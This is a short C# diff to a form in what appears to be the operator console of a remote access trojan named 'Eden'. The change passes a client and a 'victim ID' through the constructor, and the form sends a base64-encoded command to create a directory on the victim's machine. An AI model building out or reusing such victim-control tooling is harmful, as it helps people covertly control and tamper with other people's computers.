@@ -13,11 +13,14 @@ namespace Eden
     public partial class frmFileAddDir : Form
     {
         public Client m_clnt;
-        public string szVictimID;
+        public string m_szVictimID;
 
-        public frmFileAddDir()
+        public frmFileAddDir(Client clnt, string szVictimID)
         {
             InitializeComponent();
+
+            m_clnt = clnt;
+            m_szVictimID = szVictimID;
         }
 
         void setup()
@@ -32,7 +35,7 @@ namespace Eden
 
         private void button1_Click(object sender, EventArgs e)
         {
-            m_clnt.SendVictim(szVictimID, "File|new|d|" + EZCrypto.Encoder.stre2b64(textBox1.Text));
+            m_clnt.SendVictim(m_szVictimID, "File|new|d|" + EZCrypto.Encoder.stre2b64(textBox1.Text));
         }
     }
 }
